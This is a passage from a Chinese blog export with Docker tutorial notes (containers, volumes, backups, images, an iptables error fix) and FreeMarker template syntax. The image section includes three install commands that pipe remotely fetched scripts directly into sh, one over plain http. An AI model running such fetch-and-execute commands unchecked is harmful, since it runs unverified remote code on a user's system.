<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo docker run -it --rm ubuntu</span><br><span class="line">root@0ae011f7b5be:/<span class="comment"># cat /etc/os-release  </span></span><br><span class="line">NAME=<span class="string">&quot;Ubuntu&quot;</span></span><br><span class="line">VERSION=<span class="string">&quot;16.04.2 LTS (Xenial Xerus)&quot;</span></span><br><span class="line">ID=ubuntu</span><br><span class="line">ID_LIKE=debian</span><br><span class="line">PRETTY_NAME=<span class="string">&quot;Ubuntu 16.04.2 LTS&quot;</span></span><br><span class="line">VERSION_ID=<span class="string">&quot;16.04&quot;</span></span><br><span class="line">HOME_URL=<span class="string">&quot;http://www.ubuntu.com/&quot;</span></span><br><span class="line">SUPPORT_URL=<span class="string">&quot;http://help.ubuntu.com/&quot;</span></span><br><span class="line">BUG_REPORT_URL=<span class="string">&quot;http://bugs.launchpad.net/ubuntu/&quot;</span></span><br><span class="line">VERSION_CODENAME=xenial</span><br><span class="line">UBUNTU_CODENAME=xenial</span><br></pre></td></tr></table></figure>
<p><code>docker run</code> 就是运行容器的命令</p>
<ul>
<li><code>-it</code>：这是两个参数，一个是 <code>-i</code>：交互式操作，一个是 <code>-t</code> 终端。我们这里打算进入 bash 执行一些命令并查看返回结果，因此我们需要交互式终端。</li>
<li><code>--rm</code>：这个参数是说容器退出后随之将其删除。默认情况下，为了排障需求，退出的容器并不会立即删除，除非手动 <code>docker rm</code>。我们这里只是随便执行个命令，看看结果，不需要排障和保留结果，因此使用 –rm 可以避免浪费空间。</li>
<li><code>ubuntu</code>：这是指用 <code>ubuntu</code> 镜像为基础来启动容器。</li>
<li><code>bash</code>：放在镜像名后的是命令，这里我们希望有个交互式 <code>Shell</code>，因此用的是 <code>bash</code>。</li>
</ul>
<p>进入容器后，我们可以在 Shell 下操作，执行任何所需的命令。这里，我们执行了 <code>cat /etc/os-release</code>，这是 Linux 常用的查看当前系统版本的命令，从返回的结果可以看到容器内是 <code>Ubuntu 16.04.2 LTS</code> 系统。</p>
<p>最后通过 exit 退出了这个容器。</p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>运维</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>docker容器</title>
    <url>//docker-container</url>
    <content><![CDATA[<h2 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h2><p>镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的类和实例一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。</p>
<p>容器的实质是进程，但与直接在宿主执行的进程不同，容器进程运行于属于自己的独立的 命名空间。因此容器可以拥有自己的 root 文件系统、自己的网络配置、自己的进程空间，甚至自己的用户 ID 空间。容器内的进程是运行在一个隔离的环境里，使用起来，就好像是在一个独立于宿主的系统下操作一样。这种特性使得容器封装的应用比直接在宿主运行更加安全。</p>
<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建一个名为myubuntu的容器</span></span><br><span class="line"><span class="comment"># -t:分配一个伪终端  -i:让容器的标准输入保持打开</span></span><br><span class="line">$ docker run --name=myubuntu -t -i ubuntu /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个名为webserver 的nginx容器，使用卷映射本机/home/faker/myspace/nginx目录到docker目录/usr/share/nginx/html</span></span><br><span class="line">$ docker run --name=webserver -d -v /home/faker/myspace/nginx:/usr/share/nginx/html -p 80:80 nginx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看容器的输出信息（打印信息，如 echo）</span></span><br><span class="line"><span class="comment"># run的时候，使用-d将会不展示在宿主机上，可通过下面命令查看打印信息</span></span><br><span class="line">$ docker run -d ubuntu:14.04 /bin/sh -c <span class="string">&quot;while true; do echo hello world; sleep 1; done&quot;</span></span><br><span class="line">$ docker logs [container ID or NAMES]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动容器 myubuntu</span></span><br><span class="line">$ docker start myubuntu</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭容器 myubuntu</span></span><br><span class="line">$ docker stop myubuntu</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看已启动的容器 -a:查看包括未启动的容器在内的所有容器</span></span><br><span class="line">$ docker ps [-a]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入容器（Docker自带的命令）</span></span><br><span class="line">$ docker attach [name]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入容器（通过exec）</span></span><br><span class="line">$ docker <span class="built_in">exec</span> -it [name] /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导出容器快照到本地文件</span></span><br><span class="line">$ docker <span class="built_in">export</span> [container id] &gt; ubuntu.tar</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将容器快照导入为镜像</span></span><br><span class="line">$ cat ubuntu.tar | docker import - <span class="built_in">test</span>/ubuntu:v1.0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从制定 URL 或者某个目录导入</span></span><br><span class="line">$ docker import http://example.com/exampleimage.tgz example/imagerepo</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除容器 -f:删除正在运行的容器</span></span><br><span class="line">$ docker [-f] rm myubuntu</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除所有已关闭的容器</span></span><br><span class="line">$ docker rm $(docker ps -a -q)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询各容器资源使用情况</span></span><br><span class="line">$ docker stats $(docker ps --format=&#123;&#123;.Names&#125;&#125;)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>yelog</category>
        <category>运维</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>docker报错集锦</title>
    <url>//docker-errors</url>
    <content><![CDATA[<h2 id="docker创建容器"><a href="#docker创建容器" class="headerlink" title="docker创建容器"></a>docker创建容器</h2><h3 id="1-iptables-failed"><a href="#1-iptables-failed" class="headerlink" title="1. iptables failed"></a>1. iptables failed</h3><p>创建 <code>tale</code> 容器时，如下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d --privileged --hostname tale --name tale \</span><br><span class="line">-v /etc/localtime:/etc/localtime:ro \</span><br><span class="line">-v /home/tale:/var/tale_home -p 127.0.0.1:234:9000 \</span><br><span class="line">-m 1024m --memory-swap -1 tale:1.0</span><br></pre></td></tr></table></figure>
<p>然后就报了以下错误：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker: Error response from daemon: driver failed programming external connectivity on endpoint tale (263775ff559176224428ec44dcec416a1c20e6c69198d9760b38f35849914260): iptables failed: iptables --<span class="built_in">wait</span> -t nat -A DOCKER -p tcp -d 127.0.0.1 --dport 234 -j DNAT --to-destination 172.17.0.4:9000 ! -i docker0: iptables: No chain/target/match by that name.</span><br><span class="line"> (<span class="built_in">exit</span> status 1).</span><br></pre></td></tr></table></figure>
<p>解决办法：重启 docker 服务：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ service docker restart</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>yelog</category>
        <category>运维</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>docker数据管理</title>
    <url>//docker-data-manager</url>
    <content><![CDATA[<h2 id="数据卷"><a href="#数据卷" class="headerlink" title="数据卷"></a>数据卷</h2><p>数据卷是一个可供一个或多个容器使用的特殊目录，它绕过 UFS，可以提供很多有用的特性：</p>
<ul>
<li>数据卷可以在容器之间共享和重用</li>
<li>对数据卷的修改会立马生效</li>
<li>对数据卷的更新，不会影响镜像</li>
<li>数据卷默认会一直存在，即使容器被删除</li>
</ul>
<blockquote>
<p>注意：数据卷的使用，类似于 Linux 下对目录或文件进行 mount，镜像中的被指定为挂载点的目录中的文件会隐藏掉，能显示看的是挂载的数据卷。</p>
</blockquote>
<h3 id="创建一个数据卷"><a href="#创建一个数据卷" class="headerlink" title="创建一个数据卷"></a>创建一个数据卷</h3><p>在用 docker run 命令的时候，使用 -v 标记来创建一个数据卷并挂载到容器里。在一次 run 中多次使用可以挂载多个数据卷。</p>
<p>下面创建一个名为 web 的容器，并加载一个数据卷到容器的 /webapp 目录。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo docker run -d -P --name web -v /webapp training/webapp python app.py</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意：也可以在 Dockerfile 中使用 VOLUME 来添加一个或者多个新的卷到由该镜像创建的任意容器。</p>
</blockquote>
<h3 id="删除数据卷"><a href="#删除数据卷" class="headerlink" title="删除数据卷"></a>删除数据卷</h3><p>数据卷是被设计用来持久化数据的，它的生命周期独立于容器，Docker不会在容器被删除后自动删除数据卷，并且也不存在垃圾回收这样的机制来处理没有任何容器引用的数据卷。如果需要在删除容器的同时移除数据卷。可以在删除容器的时候使用 docker rm -v 这个命令。无主的数据卷可能会占据很多空间，要清理会很麻烦。Docker官方正在试图解决这个问题，相关工作的进度可以查看这个<a href="https://github.com/docker/docker/pull/8484">PR</a>。</p>
<h3 id="挂载一个主机目录作为数据卷"><a href="#挂载一个主机目录作为数据卷" class="headerlink" title="挂载一个主机目录作为数据卷"></a>挂载一个主机目录作为数据卷</h3><p>使用 -v 标记也可以指定挂载一个本地主机的目录到容器中去。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo docker run -d -P --name web -v /src/webapp:/opt/webapp training/webapp python app.py</span><br></pre></td></tr></table></figure>
<p>上面的命令加载主机的 /src/webapp 目录到容器的 /opt/webapp 目录。这个功能在进行测试的时候十分方便，比如用户可以放置一些程序到本地目录中，来查看容器是否正常工作。本地目录的路径必须是绝对路径，如果目录不存在 Docker 会自动为你创建它。</p>
<blockquote>
<p>注意：Dockerfile 中不支持这种用法，这是因为 Dockerfile 是为了移植和分享用的。然而，不同操作系统的路径格式不一样，所以目前还不能支持。</p>
</blockquote>
<p>Docker 挂载数据卷的默认权限是读写，用户也可以通过 :ro 指定为只读。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo docker run -d -P --name web -v /src/webapp:/opt/webapp:ro</span><br><span class="line">training/webapp python app.py</span><br></pre></td></tr></table></figure>
<p>加了 :ro 之后，就挂载为只读了。</p>
<h3 id="查看数据卷的具体信息"><a href="#查看数据卷的具体信息" class="headerlink" title="查看数据卷的具体信息"></a>查看数据卷的具体信息</h3><p>在主机里使用以下命令可以查看指定容器的信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ docker inspect web</span><br></pre></td></tr></table></figure>
<p>在输出的内容中找到其中和数据卷相关的部分，可以看到所有的数据卷都是创建在主机的/var/lib/docker/volumes/下面的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;Volumes&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;/webapp&quot;</span>: <span class="string">&quot;/var/lib/docker/volumes/fac362...80535&quot;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="string">&quot;VolumesRW&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;/webapp&quot;</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>注：从Docker 1.8.0起，数据卷配置在”Mounts”Key下面，可以看到所有的数据卷都是创建在主机的/mnt/sda1/var/lib/docker/volumes/….下面了。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;Mounts&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">&quot;Name&quot;</span>: <span class="string">&quot;b53ebd40054dae599faf7c9666acfe205c3e922fc3e8bc3f2fd178ed788f1c29&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;Source&quot;</span>: <span class="string">&quot;/mnt/sda1/var/lib/docker/volumes/b53ebd40054dae599faf7c9666acfe205c3e922fc3e8bc3f2fd178ed788f1c29/_data&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;Destination&quot;</span>: <span class="string">&quot;/webapp&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;Driver&quot;</span>: <span class="string">&quot;local&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;Mode&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;RW&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">                <span class="attr">&quot;Propagation&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h3 id="挂载一个本地主机文件作为数据卷"><a href="#挂载一个本地主机文件作为数据卷" class="headerlink" title="挂载一个本地主机文件作为数据卷"></a>挂载一个本地主机文件作为数据卷</h3><p>-v 标记也可以从主机挂载单个文件到容器中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo docker run --rm -it -v ~/.bash_history:/.bash_history ubuntu /bin/bash</span><br></pre></td></tr></table></figure>
<p>这样就可以记录在容器输入过的命令了。</p>
<blockquote>
<p>注意：如果直接挂载一个文件，很多文件编辑工具，包括 vi 或者 <code>sed --in-place</code>，可能会造成文件 inode 的改变，从 Docker 1.1 .0起，这会导致报错误信息。所以最简单的办法就直接挂载文件的父目录。</p>
</blockquote>
<h2 id="数据卷容器"><a href="#数据卷容器" class="headerlink" title="数据卷容器"></a>数据卷容器</h2><p>如果你有一些持续更新的数据需要在容器之间共享，最好创建数据卷容器。</p>
<p>数据卷容器，其实就是一个正常的容器，专门用来提供数据卷供其它容器挂载的。</p>
<p>首先，创建一个名为 dbdata 的数据卷容器：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo docker run -d -v /dbdata --name dbdata training/postgres <span class="built_in">echo</span> Data-only container <span class="keyword">for</span> postgres</span><br></pre></td></tr></table></figure>
<p>然后，在其他容器中使用 –volumes-from 来挂载 dbdata 容器中的数据卷。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo docker run -d --volumes-from dbdata --name db1 training/postgres</span><br><span class="line">$ sudo docker run -d --volumes-from dbdata --name db2 training/postgres</span><br></pre></td></tr></table></figure>
<p>可以使用超过一个的 <code>--volumes-from</code> 参数来指定从多个容器挂载不同的数据卷。 也可以从其他已经挂载了数据卷的容器来级联挂载数据卷。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo docker run -d --name db3 --volumes-from db1 training/postgres</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意：使用 –volumes-from 参数所挂载数据卷的容器自己并不需要保持在运行状态。</p>
</blockquote>
<p>如果删除了挂载的容器（包括 dbdata、db1 和 db2），数据卷并不会被自动删除。如果要删除一个数据卷，必须在删除最后一个还挂载着它的容器时使用 docker rm -v 命令来指定同时删除关联的容器。 这可以让用户在容器之间升级和移动数据卷。具体的操作将在下一节中进行讲解。</p>
<h2 id="利用数据卷容器来备份、恢复、迁移数据卷"><a href="#利用数据卷容器来备份、恢复、迁移数据卷" class="headerlink" title="利用数据卷容器来备份、恢复、迁移数据卷"></a>利用数据卷容器来备份、恢复、迁移数据卷</h2><p>可以利用数据卷对其中的数据进行进行备份、恢复和迁移。</p>
<h3 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h3><p>首先使用 –volumes-from 标记来创建一个加载 dbdata 容器卷的容器，并从主机挂载当前目录到容器的 /backup 目录。命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo docker run --volumes-from dbdata -v $(<span class="built_in">pwd</span>):/backup ubuntu tar cvf /backup/backup.tar /dbdata</span><br></pre></td></tr></table></figure>
<p>容器启动后，使用了 tar 命令来将 dbdata 卷备份为容器中 /backup/backup.tar 文件，也就是主机当前目录下的名为 backup.tar 的文件。</p>
<h3 id="恢复"><a href="#恢复" class="headerlink" title="恢复"></a>恢复</h3><p>如果要恢复数据到一个容器，首先创建一个带有空数据卷的容器 dbdata2。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo docker run -v /dbdata --name dbdata2 ubuntu /bin/bash</span><br></pre></td></tr></table></figure>
<p>然后创建另一个容器，挂载 dbdata2 容器卷中的数据卷，并使用 untar 解压备份文件到挂载的容器卷中。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo docker run --volumes-from dbdata2 -v $(<span class="built_in">pwd</span>):/backup busybox tar xvf</span><br><span class="line">/backup/backup.tar</span><br></pre></td></tr></table></figure>
<p>为了查看/验证恢复的数据，可以再启动一个容器挂载同样的容器卷来查看</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo docker run --volumes-from dbdata2 busybox /bin/ls /dbdata</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>yelog</category>
        <category>运维</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>docker镜像</title>
    <url>//docker-image</url>
    <content><![CDATA[<h2 id="What"><a href="#What" class="headerlink" title="What"></a>What</h2><p>Docker 镜像是一个特殊的文件系统，除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。镜像不包含任何动态数据，其内容在构建之后也不会被改变。</p>
<p>因为镜像包含操作系统完整的 root 文件系统，其体积往往是庞大的，因此在 Docker 设计时，就充分利用 Union FS 的技术，将其设计为分层存储的架构。所以严格来说，镜像并非是像一个 ISO 那样的打包文件，镜像只是一个虚拟的概念，其实际体现并非由一个文件组成，而是由一组文件系统组成，或者说，由多层文件系统联合组成。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 官方 的安装脚本</span></span><br><span class="line">$ curl -sSL https://get.docker.com/ | sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 阿里云 的安装脚本</span></span><br><span class="line">$ curl -sSL http://acs-public-mirror.oss-cn-hangzhou.aliyuncs.com/docker-engine/internet | sh -</span><br><span class="line"></span><br><span class="line"><span class="comment"># DaoCloud 的安装脚本</span></span><br><span class="line">$ curl -sSL https://get.daocloud.io/docker | sh</span><br></pre></td></tr></table></figure>

<h2 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 获取镜像，registry为空默认从Docker Hub上获取</span><br><span class="line">docker pull [选项] [Docker Registry地址]&lt;仓库名&gt;:&lt;标签&gt;</span><br><span class="line"></span><br><span class="line"># 交互式运行，退出删除: -i:交互式 ,-t:终端,--rm 退出删除 ,bash 启动bash窗口</span><br><span class="line">$ docker run -it --rm ubuntu:14.04 bash</span><br><span class="line"></span><br><span class="line"># 列出已下载的镜像（只显示顶层镜像） -a:显示所有镜像 image_name:指定列出某个镜像</span><br><span class="line">$ docker images [-a] [image_name]</span><br><span class="line"></span><br><span class="line"># 只显示虚悬镜像(dangling image) -f:--filter 过滤</span><br><span class="line">$ docker images -f dangling=true</span><br><span class="line"></span><br><span class="line"># 过滤从mongo:3.2建立之后的镜像</span><br><span class="line">$ docker images -f since=mongo:3.2</span><br><span class="line"></span><br><span class="line"># 通过label过滤</span><br><span class="line">$ docker images -f label=com.example.version=0.1</span><br><span class="line"></span><br><span class="line"># 只显示镜像id</span><br><span class="line">$ docker images -q</span><br><span class="line"></span><br><span class="line"># 只包含镜像ID和仓库名</span><br><span class="line">$ docker images --format &quot;&#123;&#123;.ID&#125;&#125;: &#123;&#123;.Repository&#125;&#125;&quot;</span><br><span class="line"></span><br><span class="line"># 以表格等距显示 有标题行，和默认一样，不过自己定义列</span><br><span class="line">$ docker images --format &quot;table &#123;&#123;.ID&#125;&#125;\t&#123;&#123;.Repository&#125;&#125;\t&#123;&#123;.Tag&#125;&#125;&quot;</span><br><span class="line"></span><br><span class="line"># 删除镜像ID为image_id的镜像</span><br><span class="line">$ docker rmi &lt;image_id&gt;</span><br><span class="line"></span><br><span class="line"># 删除虚悬镜像</span><br><span class="line">$ docker rmi $(docker images -q -f dangling=true)</span><br><span class="line"></span><br><span class="line"># 将容器保存为镜像</span><br><span class="line">$ docker commit [选项] &lt;容器ID或容器名&gt; [&lt;仓库名&gt;[:&lt;标签&gt;]]</span><br><span class="line"></span><br><span class="line"># 将容器保存为镜像</span><br><span class="line">$ docker commit \</span><br><span class="line">    --author &quot;Tao Wang &lt;twang2218@gmail.com&gt;&quot; \</span><br><span class="line">    --message &quot;修改了默认网页&quot; \</span><br><span class="line">    webserver \</span><br><span class="line">    nginx:v2</span><br><span class="line"></span><br><span class="line">$ docker history nginx:v2</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>yelog</category>
        <category>运维</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>FreeMarker语法详解</title>
    <url>//FreeMarker</url>
    <content><![CDATA[<p>FreeMarker是一款 <strong>模板引擎</strong> :即一种基于模板和要改变的数据，并用来生成输出文本（HTML网页、电子邮件、配置文件、源代码等）的通用工具。<br>FreeMarker模板文件主要有4部分组成</p>
<ol>
<li><strong>文本</strong>，直接输出的部分</li>
<li><strong>注释</strong>，即&lt;#–…–&gt;格式不会输出</li>
<li><strong>插值</strong>（Interpolation）：即${..}或者#{..}格式的部分,将使用数据模型中的部分替代输出</li>
<li><strong>FTL指令</strong>：FreeMarker指令，和HTML标记类似，名字前加#予以区分，不会输出。</li>
</ol>
<span id="more"></span>
<h2 id="一些规则"><a href="#一些规则" class="headerlink" title="一些规则"></a>一些规则</h2><h3 id="FTL指令规则"><a href="#FTL指令规则" class="headerlink" title="FTL指令规则"></a>FTL指令规则</h3><p>FreeMarker有三种FTL标签，这和HTML的标签是完全类似的<br>     开始标签：&lt;#directivename parameters&gt;<br>     结束标签：&lt;/#directivename&gt;<br>     空标签： &lt;#directivename parameters /&gt;<br>     实际上，使用标签时前面的#符号也可能变成@，如果该指令是一个用户指令而不是系统内建指令时，应将#符号改为@符号</p>
<h3 id="插值规则"><a href="#插值规则" class="headerlink" title="插值规则"></a>插值规则</h3><p>FreeMarker的插值有如下两种类型<br>    1、通用插值：${expr}<br>    2、数字格式化插值：#{expr}或者#{expr;format}<br>通用插值，有可以分为四种情况<br>    a、插值结果为字符串值：直接输出表达式结果<br>    b、插值结果为数字值：根据默认格式(#setting 指令设置)将表达式结果转换成文本输出。可以使用内建的字符串函数格式单个插值，例如</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&lt;<span class="meta">#setting number_format = <span class="meta-string">&quot;currency&quot;</span> /&gt;</span></span><br><span class="line">&lt;<span class="meta">#assign str = 42 /&gt;</span></span><br><span class="line">$&#123;str&#125;</span><br><span class="line">$&#123;str?<span class="built_in">string</span>&#125;</span><br><span class="line">$&#123;str?<span class="built_in">string</span>.number&#125;</span><br><span class="line">$&#123;str?<span class="built_in">string</span>.currency&#125;</span><br><span class="line">$&#123;str?<span class="built_in">string</span>.percent&#125;</span><br><span class="line">$&#123;str?<span class="built_in">string</span>.computer&#125;</span><br><span class="line"></span><br><span class="line">日期处理</span><br><span class="line">$&#123;openingTime?<span class="built_in">string</span>.<span class="keyword">short</span>&#125;</span><br><span class="line">$&#123;openingTime?<span class="built_in">string</span>.medium&#125;</span><br><span class="line">$&#123;openingTime?<span class="built_in">string</span>.<span class="keyword">long</span>&#125;</span><br><span class="line">$&#123;openingTime?<span class="built_in">string</span>.full&#125;</span><br><span class="line">$&#123;nextDiscountDay?<span class="built_in">string</span>.<span class="keyword">short</span>&#125;</span><br><span class="line">$&#123;nextDiscountDay?<span class="built_in">string</span>.medium&#125;</span><br><span class="line">$&#123;nextDiscountDay?<span class="built_in">string</span>.<span class="keyword">long</span>&#125;</span><br><span class="line">$&#123;nextDiscountDay?<span class="built_in">string</span>.full&#125;</span><br><span class="line">$&#123;lastUpdated?<span class="built_in">string</span>.<span class="keyword">short</span>&#125;</span><br><span class="line">$&#123;lastUpdated?<span class="built_in">string</span>.medium&#125;</span><br><span class="line">$&#123;lastUpdated?<span class="built_in">string</span>.<span class="keyword">long</span>&#125;</span><br><span class="line">$&#123;lastUpdated?<span class="built_in">string</span>.full&#125;</span><br><span class="line">$&#123;lastUpdated?<span class="built_in">string</span>(<span class="string">&quot;yyyy-MM-dd HH:mm:ss zzzz&quot;</span>)&#125;</span><br><span class="line">$&#123;lastUpdated?<span class="built_in">string</span>(<span class="string">&quot;EEE, MMM d, &#x27;&#x27;yy&quot;</span>)&#125;</span><br><span class="line">$&#123;lastUpdated?<span class="built_in">string</span>(<span class="string">&quot;EEEE, MMMM dd, yyyy, hh:mm:ss a &#x27;(&#x27;zzz&#x27;)&#x27;&quot;</span>)&#125;</span><br></pre></td></tr></table></figure>
<h3 id="if-elseif-elseif"><a href="#if-elseif-elseif" class="headerlink" title="if,elseif,elseif"></a>if,elseif,elseif</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&lt;<span class="meta">#<span class="meta-keyword">if</span> condition&gt;</span></span><br><span class="line">……</span><br><span class="line">&lt;<span class="meta">#elseif condition2&gt;</span></span><br><span class="line">……</span><br><span class="line">&lt;<span class="meta">#<span class="meta-keyword">else</span>&gt;</span></span><br><span class="line">……</span><br><span class="line">&lt;/<span class="meta">#<span class="meta-keyword">if</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="switch-case"><a href="#switch-case" class="headerlink" title="switch,case"></a>switch,case</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&lt;<span class="meta">#switch value&gt;  </span></span><br><span class="line">  &lt;<span class="meta">#case refValue1&gt;  </span></span><br><span class="line">         ...  </span><br><span class="line">         &lt;<span class="meta">#break&gt;  </span></span><br><span class="line">  &lt;<span class="meta">#case refValue2&gt;  </span></span><br><span class="line">         ...  </span><br><span class="line">         &lt;<span class="meta">#break&gt;  </span></span><br><span class="line">  ...  </span><br><span class="line">  &lt;<span class="meta">#case refValueN&gt;  </span></span><br><span class="line">         ...  </span><br><span class="line">         &lt;<span class="meta">#break&gt;  </span></span><br><span class="line">  &lt;<span class="meta">#default&gt;</span></span><br><span class="line">         ...  </span><br><span class="line">&lt;/<span class="meta">#switch&gt;  </span></span><br><span class="line">&lt;<span class="meta">#t&gt; 去掉左右空白和回车换行  </span></span><br><span class="line"></span><br><span class="line">&lt;<span class="meta">#lt&gt;去掉左边空白和回车换行  </span></span><br><span class="line"></span><br><span class="line">&lt;<span class="meta">#rt&gt;去掉右边空白和回车换行  </span></span><br><span class="line"></span><br><span class="line">&lt;<span class="meta">#nt&gt;取消上面的效果  </span></span><br></pre></td></tr></table></figure>
<h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&lt;<span class="meta">#list sequence as item&gt;  </span></span><br><span class="line">...  </span><br><span class="line">&lt;<span class="meta">#<span class="meta-keyword">if</span> item = <span class="meta-string">&quot;spring&quot;</span>&gt;</span></span><br><span class="line">  &lt;<span class="meta">#break&gt;</span></span><br><span class="line">&lt;/<span class="meta">#<span class="meta-keyword">if</span>&gt;  </span></span><br><span class="line">...  </span><br><span class="line">&lt;/<span class="meta">#list&gt;  </span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>iterm_index:当前值得下标，从0开始<br>item_has_next:判断list是否还有值</p>
</blockquote>
<h3 id="include"><a href="#include" class="headerlink" title="include"></a>include</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&lt;<span class="meta">#<span class="meta-keyword">include</span> filename [options]&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>options 包含两个属性<br>encoding=”GBK”<br>parse=”true” 是否作为ftl语法解析，默认是true<br>示例：&lt;#include “/common/copyright.ftl” encoding=”GBK” parse=”true”&gt;</p>
</blockquote>
<h3 id="import"><a href="#import" class="headerlink" title="import"></a>import</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&lt;<span class="meta">#import path as hash&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>类似于java里的import,它导入文件，然后就可以在当前文件里使用被导入文件里的宏组件</p>
</blockquote>
<h3 id="compress"><a href="#compress" class="headerlink" title="compress"></a>compress</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&lt;<span class="meta">#compress&gt;  </span></span><br><span class="line">  ...  </span><br><span class="line">&lt;/<span class="meta">#compress&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="escape-noescape"><a href="#escape-noescape" class="headerlink" title="escape, noescape"></a>escape, noescape</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&lt;<span class="meta">#escape identifier as expression&gt;  </span></span><br><span class="line">  ...  </span><br><span class="line">  &lt;<span class="meta">#noescape&gt;...<span class="meta-string">&lt;/#noescape&gt;</span>  </span></span><br><span class="line">  ...  </span><br><span class="line">&lt;/<span class="meta">#escape&gt;  </span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>主要使用在相似的字符串变量输出，比如某一个模块的所有字符串输出都必须是html安全的，这个时候就可以使用该表达式<br>示例：</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&lt;<span class="meta">#escape x as x?html&gt;  </span></span><br><span class="line">  First name: $&#123;firstName&#125;  </span><br><span class="line">  &lt;<span class="meta">#noescape&gt;Last name: $&#123;lastName&#125;<span class="meta-string">&lt;/#noescape&gt;</span>  </span></span><br><span class="line">  Maiden name: $&#123;maidenName&#125;  </span><br><span class="line">&lt;/<span class="meta">#escape&gt;  </span></span><br></pre></td></tr></table></figure>
<p>相同表达式</p>
